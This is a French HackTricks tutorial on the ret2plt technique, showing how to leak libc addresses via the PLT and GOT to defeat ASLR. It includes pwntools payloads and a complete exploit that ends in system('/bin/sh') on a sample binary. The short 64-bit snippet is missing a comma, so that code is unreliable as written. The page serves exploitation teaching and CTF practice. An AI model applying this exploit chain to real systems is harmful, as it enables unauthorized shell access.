# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## Informations de base

L'objectif de cette technique est de **leak une adresse d'une fonction du PLT** afin de pouvoir contourner ASLR. En effet, si par exemple vous leak l'adresse de la fonction `puts` de la libc, vous pouvez alors **calculer la base de `libc`** et déterminer les offsets pour accéder à d'autres fonctions telles que **`system`**.

Cela peut être fait avec un payload `pwntools` tel que ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Remarquez comment **`puts`** (en utilisant l'adresse depuis la PLT) est appelé avec l'adresse de `puts` située dans la GOT (Global Offset Table). Ceci est parce qu'au moment où `puts` affiche l'entrée GOT de puts, cette **entrée contiendra l'adresse exacte de `puts` en mémoire**.

Remarquez aussi comment l'adresse de `main` est utilisée dans l'exploit afin que, lorsque `puts` termine son exécution, le **binaire appelle de nouveau `main` au lieu de quitter** (ainsi l'adresse leakée restera valide).

> [!CAUTION]
> Notez que pour que cela fonctionne le **binaire ne peut pas être compilé avec PIE** ou vous devez avoir **trouvé un leak pour bypasser PIE** afin de connaître l'adresse de la PLT, GOT et main. Sinon, vous devez d'abord bypasser PIE.

Vous pouvez trouver un [**exemple complet de ce bypass ici**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). Ceci était l'exploit final de cet **exemple**:

<details>
<summary>Exemple d'exploit complet (ret2plt leak + system)</summary>
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
</details>

## Considérations modernes

- **`-fno-plt` builds** (commons dans les distributions modernes) remplacent `call foo@plt` par `call [foo@got]`. Si le binaire n'a pas de stub `foo@plt`, vous pouvez toujours leak l'adresse résolue avec `puts(elf.got['foo'])` et ensuite **retourner directement vers l'entrée GOT** (`flat(padding, elf.got['foo'])`) pour sauter dans libc une fois que le lazy binding est terminé.
- **Full RELRO / `-Wl,-z,now`** : le GOT est en lecture seule mais ret2plt fonctionne toujours pour les leak car vous ne faites que lire la case GOT. Si le symbole n'a jamais été appelé, votre premier ret2plt effectuera aussi le lazy binding puis imprimera la case résolue.
- **ASLR + PIE** : si PIE est activé, leak d'abord un pointeur de code (par ex., adresse de retour sauvegardée, pointeur de fonction, ou entrée `.plt` via un autre format‑string/infoleak) pour calculer la base PIE, puis construisez la chaîne ret2plt avec les adresses PLT/GOT rébasées.
- **Architectures non‑x86 avec BTI/PAC (AArch64)** : les entrées PLT sont des BTI landing pads valides (`bti c`), donc lors de l'exploitation de binaires avec BTI activé privilégiez sauter dans le stub PLT (ou un autre gadget annoté BTI) plutôt que d'aller directement dans un gadget libc sans BTI, sinon le CPU déclenchera des échecs `BRK`/`PAC`.
- **Astuce de résolution rapide** : si la fonction cible n'est pas encore résolue et que vous avez besoin d'un leak en une seule fois, enchaînez l'appel PLT deux fois : d'abord `elf.plt['foo']` (pour résoudre) puis à nouveau `elf.plt['foo']` avec l'adresse GOT comme argument pour afficher la case désormais remplie.

## Autres exemples & références

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bits, ASLR activé mais pas de PIE : la première étape est de remplir un overflow jusqu'à l'octet 0x00 du canary, puis appeler puts et le leak. Avec le canary, un gadget ROP est créé pour appeler puts afin de leak l'adresse de puts depuis le GOT et un gadget ROP pour appeler `system('/bin/sh')`.
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR activé, pas de canary, stack overflow dans main depuis une fonction enfant. Gadget ROP pour appeler puts afin de leak l'adresse de puts depuis le GOT puis appeler un one gadget.

## Références

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)

{{#include ../../../banners/hacktricks-training.md}}
